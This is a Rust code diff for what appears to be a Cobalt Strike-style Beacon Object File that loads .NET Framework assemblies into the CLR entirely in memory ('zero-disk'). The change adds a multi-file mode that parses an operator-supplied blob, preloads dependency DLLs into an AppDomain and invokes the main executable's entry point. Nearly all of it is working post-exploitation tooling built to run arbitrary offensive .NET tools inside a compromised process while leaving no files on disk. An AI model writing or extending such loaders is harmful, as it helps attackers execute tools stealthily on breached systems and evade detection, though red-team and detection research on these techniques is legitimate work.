@@ -1,7 +1,24 @@
-//! .NET Framework 4.x path (ICLRMetaHost → ICorRuntimeHost → AppDomain.Load_3).
+//! .NET Framework 4.x path.
+//!
+//! Two modes:
+//!
+//! - **Single-file** (`run`): `AppDomain.Load_3(byte[])` + `MethodInfo.Invoke_3`.
+//!   Zero-disk. Works for non-merged .NET Framework binaries.
+//!
+//! - **Multi-file** (`run_multi`): operator passes a directory. CNA bundles all
+//!   `.dll`/`.exe` files. BOF pre-loads each dependency `.dll` via `Load_3`
+//!   (keeping the `ComPtr<Assembly>` alive so the dep isn't evicted from the
+//!   AppDomain), then loads the main `.exe`, then invokes its entry point.
+//!
+//! **Known limitations** (CLR-side, not BOF bugs):
+//! - Costura.Fody-merged binaries fail `Load_3` with `ERROR_BAD_FORMAT` —
+//!   the CLR's metadata validator rejects Costura-mangled bundles.
+//! - Tools with native dependencies (`.dll` loaded via P/Invoke from disk)
+//!   can't be supported via in-memory load alone.
 
 use crate::error::BofError;
 use crate::pe_parser::AsmInfo;
+use alloc::string::String;
 use alloc::vec::Vec;
 use core::ffi::c_void;
 use opsec_com::appdomain::{AppDomain, Assembly, MethodInfo};
@@ -17,10 +34,7 @@ const V4_VERSION: &[u16] = &[
     b'3' as u16, b'0' as u16, b'3' as u16, b'1' as u16, b'9' as u16, 0,
 ];
 
-/// NetFx4 path orchestrator: start CLR → create domain → load assembly → invoke.
-///
-/// # Safety
-/// `asm_bytes` must point to a valid .NET Framework 4.x managed PE.
+/// NetFx4 orchestrator (single-file): byte[] load + invoke.
 pub unsafe fn run(
     info: &AsmInfo,
     asm_bytes: &[u8],
@@ -36,9 +50,83 @@ pub unsafe fn run(
     }
 }
 
+/// NetFx4 orchestrator (multi-file): pre-load deps then load main + invoke.
+pub unsafe fn run_multi(
+    info: &AsmInfo,
+    files: &[(String, Vec<u8>)],
+    main_name: &str,
+    app_domain: &str,
+    asm_args: &str,
+    entry_point_flag: u32,
+) -> Result<(), BofError> {
+    unsafe {
+        let host = start(info)?;
+        let domain = create_domain(&host, app_domain)?;
+
+        // Keep ComPtr<Assembly> values alive in a Vec — calling Release on
+        // them too early can evict the managed Assembly from the AppDomain
+        // before the main assembly resolves its references.
+        let mut _deps: Vec<ComPtr<Assembly>> = Vec::new();
+        for (name, bytes) in files {
+            if name.as_str() == main_name {
+                continue;
+            }
+            if let Ok(dep) = load_assembly(&domain, bytes) {
+                _deps.push(dep);
+            }
+        }
+
+        let main_bytes = files
+            .iter()
+            .find(|(n, _)| n.as_str() == main_name)
+            .map(|(_, b)| b.as_slice())
+            .ok_or(BofError::Clr { hr: -1, op: "mNoMain" })?;
+        let assembly = load_assembly(&domain, main_bytes)?;
+        invoke(&assembly, asm_args, entry_point_flag)
+    }
+}
+
+/// Parse the multi-file blob into (name, body) pairs.
+/// Layout: `[n: u32 LE]` then `n × ([name_len: u32] [name UTF-8] [body_len: u32] [body])`.
+pub fn parse_multi_blob(blob: &[u8]) -> Result<Vec<(String, Vec<u8>)>, BofError> {
+    if blob.len() < 4 {
+        return Err(BofError::Clr { hr: -1, op: "mTrunc" });
+    }
+    let n = u32::from_le_bytes([blob[0], blob[1], blob[2], blob[3]]) as usize;
+    let mut off = 4usize;
+    let mut out = Vec::with_capacity(n);
+    for _ in 0..n {
+        if off + 4 > blob.len() {
+            return Err(BofError::Clr { hr: -1, op: "mTrunc" });
+        }
+        let name_len = u32::from_le_bytes([
+            blob[off], blob[off + 1], blob[off + 2], blob[off + 3],
+        ]) as usize;
+        off += 4;
+        if off + name_len > blob.len() {
+            return Err(BofError::Clr { hr: -1, op: "mTrunc" });
+        }
+        let name = String::from_utf8(blob[off..off + name_len].to_vec())
+            .map_err(|_| BofError::Clr { hr: -1, op: "mUtf8" })?;
+        off += name_len;
+        if off + 4 > blob.len() {
+            return Err(BofError::Clr { hr: -1, op: "mTrunc" });
+        }
+        let body_len = u32::from_le_bytes([
+            blob[off], blob[off + 1], blob[off + 2], blob[off + 3],
+        ]) as usize;
+        off += 4;
+        if off + body_len > blob.len() {
+            return Err(BofError::Clr { hr: -1, op: "mTrunc" });
+        }
+        let body = blob[off..off + body_len].to_vec();
+        off += body_len;
+        out.push((name, body));
+    }
+    Ok(out)
+}
+
 unsafe fn start(_info: &AsmInfo) -> Result<ComPtr<ICorRuntimeHost>, BofError> {
-    // NetFx4 path always uses v4.0.30319. .NET 2.0/3.5 (v2.0.50727) support
-    // was removed in v0.2 — modern targets ship .NET 4.x by default.
     unsafe { start_clr(V4_VERSION).map_err(|hr| BofError::Clr { hr, op: "c1" }) }
 }
 
@@ -67,8 +155,10 @@ unsafe fn create_domain(
             &IID_APP_DOMAIN,
             &mut domain,
         );
-        ((*(*unk).vtbl).release)(unk as *mut c_void);
+        // Do not release the thunk on success — the CLR marshaler/proxy must
+        // stay alive for the AppDomain to remain valid through Load_3.
         if hr < 0 {
+            ((*(*unk).vtbl).release)(unk as *mut c_void);
             return Err(BofError::Clr { hr, op: "c3" });
         }
         ComPtr::<AppDomain>::from_raw(domain as *mut _)
@@ -86,7 +176,6 @@ unsafe fn load_assembly(
         if !sa.copy_from(asm) {
             return Err(BofError::Clr { hr: -1, op: "c5b" });
         }
-
         let d = domain.as_raw();
         let mut asm_ptr: *mut c_void = core::ptr::null_mut();
         let hr = ((*(*d).vtbl).load_3)(d as *mut c_void, sa.ptr, &mut asm_ptr);
